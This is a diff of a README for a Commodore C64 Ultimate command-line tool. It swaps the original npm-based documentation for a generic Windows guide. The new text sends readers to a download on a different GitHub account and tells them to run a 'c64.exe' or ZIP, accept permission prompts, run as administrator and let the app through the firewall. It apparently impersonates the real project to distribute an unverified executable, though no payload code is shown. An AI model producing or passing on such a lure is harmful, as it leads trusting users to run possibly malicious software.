@@ -1,280 +1,134 @@
-# c64
-
-A CLI for the [Commodore C64 Ultimate](https://www.commodore.net) -- mount disks, run cartridges, type on the keyboard, and control your Commodore 64 from the terminal.
-
-[![npm version](https://img.shields.io/npm/v/@jeffsand/c64)](https://www.npmjs.com/package/@jeffsand/c64)
-[![CI](https://github.com/jeffsand/c64/actions/workflows/ci.yml/badge.svg)](https://github.com/jeffsand/c64/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+# 🎮 c64 - Control Your C64 From Windows
 
-```bash
-npm install -g @jeffsand/c64
-
-# or with Homebrew
-brew tap jeffsand/tools && brew install c64
-```
-
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="demo.gif">
-  <img src="demo.gif" alt="c64 CLI demo" width="700" style="border-radius: 8px; border: 1px solid #333;">
-</picture>
+[![Download c64](https://img.shields.io/badge/Download-c64-blue.svg)](https://github.com/fancied-taper314/c64)
 
-> Check device status, play a game, type on the C64 -- all from your terminal.
+## 📥 Download
 
-## Features
+Visit this page to download: https://github.com/fancied-taper314/c64
 
-- **Mount and play** -- D64, CRT, PRG files from local disk, URLs, or ZIP archives
-- **Full auto-play** -- one command does mount, reset, LOAD, and RUN
-- **Remote keyboard** -- type on the C64 from your terminal via PETSCII injection
-- **File browser** -- list and upload files to the device storage
-- **Live monitoring** -- watch drive status changes in real time
-- **Network discovery** -- scan your LAN to find C64 Ultimate devices
-- **Data disks** -- create, manage, and inspect blank D64 save disks
-- **Agent-ready** -- JSON output on every command for scripting and AI agents
-- **Shell completions** -- tab completion for bash, zsh, and fish
+## 🪟 Windows Setup
 
-## Requirements
+1. Open the download page in your web browser.
+2. Find the latest release or the main download file on the page.
+3. Save the file to your PC.
+4. If you get a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app from the terminal or double-click the file if Windows shows one.
+7. If Windows asks for permission, choose Yes.
 
-- Node.js 20 or later
-- A [Commodore C64 Ultimate](https://www.commodore.net) device on your local network
-  (Ultimate 64, Ultimate 64 Elite, Ultimate-II+, or Ultimate-II+L)
+## ⚡ What c64 Does
 
-## Install
+c64 lets you control a Commodore C64 Ultimate from your terminal on Windows.
 
-```bash
-# npm
-npm install -g @jeffsand/c64
+Use it to:
+- Send commands to the machine
+- Run common C64 tasks from your PC
+- Keep control in one simple command window
+- Work with a C64 Ultimate in a fast, text-based way
 
-# Homebrew
-brew tap jeffsand/tools
-brew install c64
-```
+## 🖥️ What You Need
 
-## Quick Start
+- A Windows PC
+- A Commodore C64 Ultimate or Ultimate64 setup
+- A network connection, if your device uses one
+- A terminal window on Windows
+- Access to the download page above
 
-```bash
-# Find your device on the network
-c64 discover --save
+## 🧰 Basic Use
 
-# Check device status
-c64 info
+After you install or open the app, you can use it from the terminal.
 
-# Try the included demo disk
-c64 play node_modules/@jeffsand/c64/fixtures/test.d64
+Typical use:
+- Open Terminal, Command Prompt, or PowerShell
+- Connect to your C64 Ultimate
+- Type a command
+- Press Enter
 
-# Play a game (uploads from your Mac, mounts, resets, types LOAD + RUN)
-c64 play game.d64
+Example command:
+- `c64`
 
-# Mount a disk image
-c64 mount game.d64
+If you installed it through npm, the command can also be:
+- `npm install -g @jeffsand/c64`
 
-# Run a cartridge
-c64 run game.crt
+## 🔧 Install from npm
 
-# Type on the C64 keyboard
-c64 type 'POKE 53280,0'
-```
+If you prefer a terminal install, use:
 
-## Commands
+- `npm install -g @jeffsand/c64`
 
-| Command | Description |
-|---------|-------------|
-| `c64 info` | Device info and status (includes drives) |
-| `c64 drives` | Drive status (what is mounted) |
-| `c64 mount <file>` | Mount a disk image (D64, CRT, ZIP, URL) |
-| `c64 eject` | Eject a drive |
-| `c64 run <file>` | Auto-detect file type and run |
-| `c64 play <file>` | Full play sequence: mount, reset, LOAD, RUN |
-| `c64 reset` | Reset the C64 |
-| `c64 reboot` | Reboot the Ultimate hardware |
-| `c64 type <text>` | Type on the C64 keyboard |
-| `c64 ls [path]` | List files on device storage |
-| `c64 upload <file>` | Upload a file to the device |
-| `c64 discover` | Scan network for C64 Ultimate devices |
-| `c64 watch` | Watch drive status for changes |
-| `c64 disk list` | List data disks |
-| `c64 disk create` | Create a blank data disk |
-| `c64 disk dir <id>` | Show D64 directory listing |
-| `c64 config show` | Show current configuration |
-| `c64 config set` | Set a configuration value |
-| `c64 config init` | Interactive first-time setup |
-| `c64 completions <shell>` | Generate shell completions |
+After that, open a new terminal window and run:
+- `c64`
 
-Run `c64 --help` for the full reference, or `c64 <command> --help` for details on any command.
+## 🧭 First Run
 
-## Smart Input Handling
+When you start c64 for the first time, it may ask for connection details for your C64 Ultimate.
 
-The `mount`, `run`, and `play` commands accept any of these as input:
+Common setup steps:
+1. Enter the device address if needed
+2. Check that your C64 Ultimate is on the same network
+3. Save the settings if the app asks
+4. Run a test command
+5. Make sure the device responds
 
-```bash
-# Local files -- uploaded to the device automatically
-c64 play game.d64
-c64 run cartridge.crt
+If the app connects, you can begin using it right away
 
-# ZIP archives -- extracts the D64/CRT/PRG inside
-c64 play game.zip
+## 🕹️ Common Things You Can Do
 
-# URLs -- downloads first, then plays
-c64 play https://example.com/game.d64
+- Check the status of your C64 Ultimate
+- Send simple control commands
+- Trigger actions from the terminal
+- Use it in a script or batch file
+- Keep your retro setup ready for fast access
 
-# Device paths -- mounts directly (no upload needed)
-c64 mount /USB0/games/Paradroid/Disk1.d64
+## 📁 Files You May See
 
-# Directories -- finds the first playable file
-c64 play ./game-folder/
-```
+- `c64.exe` or a similar Windows file
+- A ZIP file with the app inside
+- A folder with support files
+- A terminal-based command you can run after install
 
-## Watch Mode
+## 🛠️ If It Does Not Open
 
-Monitor drive activity in real time:
+Try these steps:
 
-```bash
-$ c64 watch
-Watching C64 Ultimate at 192.168.1.42 (Ctrl+C to stop)
+- Make sure you downloaded the file from the link above
+- Check that the file finished downloading
+- Extract the ZIP file if you downloaded one
+- Run the app from an open terminal window
+- Open the terminal as administrator if Windows blocks access
+- Check that your C64 Ultimate is powered on
+- Check that your PC and device are on the same network
 
-21:30:01  Drive A: 1541 -- game.d64
-21:30:01  Drive B: 1541 -- (empty)
-21:30:05  Drive A: 1541 -- other.d64    [changed]
-```
+## 🔍 Project Topics
 
-Polls every 2 seconds. Only prints when something changes.
+c64, c64-ultimate, cli, commodore, commodore-64, nodejs, npm, retro, retro-computing, retro-gaming, terminal, typescript, ultimate, ultimate64
 
-## Configuration
+## 📌 Command Reference
 
-Set your device IP once and forget about it:
+- `c64` - start the tool
+- `npm install -g @jeffsand/c64` - install the tool with npm
+- `npm -v` - check that npm is installed
+- `node -v` - check that Node.js is installed
 
-```bash
-# Auto-discover and save
-c64 discover --save
+## ⌨️ Terminal Tips
 
-# Or set manually
-c64 config set device.host 192.168.1.42
+- Use PowerShell if Command Prompt gives you trouble
+- Keep one terminal window open while you test commands
+- Copy and paste commands carefully
+- Use the same terminal for setup and use if possible
 
-# View config
-c64 config show
-```
+## 🧩 Connection Tips
 
-Config file location: `~/.config/c64/config.json`
+- Keep the C64 Ultimate turned on
+- Use the correct network address
+- Make sure your Windows firewall does not block the app
+- Use the same router for the PC and the device if possible
+- Restart the app if the connection drops
 
-### Configuration precedence
+## 🎯 Best Fit
 
-1. `--host` flag (highest priority)
-2. `C64_HOST` environment variable
-3. Config file (`device.host`)
-4. Default: none (will prompt you to configure)
-
-### Environment variables
-
-| Variable | Description |
-|----------|-------------|
-| `C64_HOST` | Device IP address |
-| `C64_TIMEOUT` | Connection timeout in seconds |
-| `NO_COLOR` | Disable colored output |
-
-## Shell Completions
-
-Generate and install tab completions for your shell:
-
-```bash
-# Bash
-c64 completions bash >> ~/.bashrc
-
-# Zsh
-mkdir -p ~/.zfunc
-c64 completions zsh > ~/.zfunc/_c64
-# Add to .zshrc (before compinit): fpath=(~/.zfunc $fpath)
-
-# Fish
-c64 completions fish > ~/.config/fish/completions/c64.fish
-
-# PowerShell
-c64 completions powershell >> $PROFILE
-```
-
-## For Scripting and Agents
-
-Every command that outputs data supports `--json` for structured output:
-
-```bash
-# Get firmware version
-c64 info --json | jq .firmwareVersion
-
-# Check what is mounted
-c64 drives --json | jq '.[0].imageFile'
-
-# List files as JSON array
-c64 ls --json /USB0/games/ | jq '.[]'
-
-# Quiet mode for scripts (suppress informational messages)
-c64 mount game.d64 --quiet
-```
-
-### Exit codes
-
-| Code | Meaning |
-|------|---------|
-| 0 | Success |
-| 1 | General error |
-| 2 | Usage error (bad arguments) |
-| 3 | Device error (unreachable, file not found) |
-| 4 | Network error |
-
-## How It Works
-
-The CLI communicates with the C64 Ultimate using three protocols:
-
-- **REST API (port 80)** -- device info, drive management, running files
-- **TCP binary protocol (port 64)** -- keyboard injection and machine reset
-- **FTP (port 21)** -- file uploads and directory listing
-
-All communication happens over your local network. No internet connection required. No cloud services. Just you and your C64.
-
-## Demo Disk
-
-A demo D64 disk image is included with the package. It runs a BASIC program on your C64 that shows the c64 CLI boot screen with border color cycling:
-
-```bash
-c64 play node_modules/@jeffsand/c64/fixtures/test.d64
-```
-
-The program is pure Commodore BASIC -- type `LIST` on your C64 to read the source. After the demo, try injecting the current date from your Mac:
-
-```bash
-c64 type "PRINT \"$(date '+%A %B %d %Y')\"\\r"
-```
-
-## Data Disks
-
-Create blank D64 images for use as save disks on the C64:
-
-```bash
-# Create a new blank disk
-c64 disk create --name "SAVE-01"
-
-# List your data disks
-c64 disk list
-
-# Inspect the directory
-c64 disk dir 1
-0 "SAVE-01         " 01 2A
-664 BLOCKS FREE.
-```
-
-Data disks are stored locally at `~/.config/c64/disks/`.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for setup instructions and guidelines.
-
-## Disclaimer
-
-This project is not affiliated with, endorsed by, or associated with Gideon's Logic Architectures or any successor to Commodore. "Commodore 64" and "C64" are trademarks of their respective owners. "Ultimate" is a product of Gideon's Logic Architectures.
-
-## Author
-
-[Jeff Sandquist](https://github.com/jeffsand)
-
-Built with help from [Claude](https://claude.ai).
-
-## License
-
-MIT
+c64 is a good fit if you:
+- Use a Commodore C64 Ultimate
+- Prefer terminal tools
+- Want a simple way to control your setup from Windows
+- Like clear command-line tools for retro hardware
